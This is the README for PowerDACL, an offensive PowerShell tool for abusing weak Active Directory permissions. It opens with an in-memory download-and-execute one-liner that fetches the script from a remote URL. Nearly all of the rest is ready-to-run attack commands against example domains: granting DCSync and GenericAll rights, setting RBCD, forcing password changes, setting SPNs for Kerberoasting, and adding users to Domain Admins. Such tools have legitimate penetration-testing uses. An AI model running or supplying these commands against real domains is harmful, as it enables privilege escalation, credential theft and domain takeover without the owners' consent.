# PowerDACL
A tool to abuse weak permissions of Active Directory Discretionary Access Control Lists (DACLs) and Access Control Entries (ACEs)

## Load PowerDACL in memory

```
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/PowerDACL/main/PowerDACL.ps1')
```

## Help Page
```
PowerDACL
```

## Grant DCSync rights
```
DCSync -Target username -TargetDomain ferrari.local -TargetServer dc01.ferrari.local
```

## Grant GenericAll rights
```
GenericAll -Target MSSQL01$ -TargetDomain ferrari.local -TargetServer dc01.ferrari.local -Grantee username
```
```
GenericAll -Target MSSQL01$ -TargetDomain ferrari.local -TargetServer dc01.ferrari.local -Grantee username -GranteeDomain domain.local -GranteeServer dc02.domain.local
```

## Set RBCD:
```
RBCD -Target MSSQL01$ -TargetDomain ferrari.local -TargetServer dc01.ferrari.local -Grantee username
```
```
RBCD -Target MSSQL01$ -TargetDomain ferrari.local -TargetServer dc01.ferrari.local -Grantee username -GranteeDomain domain.local -GranteeServer dc02.domain.local
```
```
RBCD -Clear -Target MSSQL01$ -TargetDomain ferrari.local -TargetServer dc01.ferrari.local
```

## Add Computer to domain
```
AddComputer -ComputerName evilcomputer -Password P@ssw0rd! -Domain ferrari.local -Server dc01.ferrari.local
```
```
AddComputer -ComputerName evilcomputer -Domain ferrari.local -Server dc01.ferrari.local
```

## Delete Computer from domain
```
DeleteComputer -ComputerName evilcomputer -Domain ferrari.local -Server dc01.ferrari.local
```

## Force Change Password
```
ForceChangePass -Target username -Password P@ssw0rd! -TargetDomain ferrari.local -TargetServer dc01.ferrari.local
```

## Set SPN:
```
SetSPN -Target username -TargetDomain ferrari.local -TargetServer dc01.ferrari.local
```
```
SetSPN -Target username -TargetDomain ferrari.local -TargetServer dc01.ferrari.local -SPN "test/test"
```

## Remove SPN:
```
RemoveSPN -Target username -TargetDomain ferrari.local -TargetServer dc01.ferrari.local
```

## Set Owner
```
SetOwner -Target MSSQL01$ -TargetDomain ferrari.local -TargetServer dc01.ferrari.local -Owner username
```
```
SetOwner -Target MSSQL01$ -TargetDomain ferrari.local -TargetServer dc01.ferrari.local -Owner username -OwnerDomain domain.local -OwnerServer dc02.domain.local
```

## Enable Account
```
EnableAccount -Target myComputer$ -Domain ferrari.local -Server dc01.ferrari.local
```

## Disable Account
```
DisableAccount -Target myComputer$ -Domain ferrari.local -Server dc01.ferrari.local
```

## Add object to a group
```
AddToGroup -Target user -TargetDomain ferrari.local -TargetServer dc01.ferrari.local -Group "Domain Admins"
```
```
 AddToGroup -Target user -TargetDomain ferrari.local -TargetServer dc01.ferrari.local -Group "Domain Admins" -GroupDomain domain.local -GroupServer dc02.domain.local
```

## Remove object from a group
```
RemoveFromGroup -Target user -TargetDomain ferrari.local -TargetServer dc01.ferrari.local -Group "Domain Admins"
```
```
RemoveFromGroup -Target user -TargetDomain ferrari.local -TargetServer dc01.ferrari.local -Group "Domain Admins" -GroupDomain domain.local -GroupServer dc02.domain.local
```

## Modify or clear a property for an object
```
Set-DomainObject -Identity user -Set @{'userprincipalname' = "user@domain.com"}
```
```
Set-DomainObject -Identity user -Clear 'userprincipalname'
```

## Shadow Credentials

https://github.com/Leo4j/KeyCredentialLink
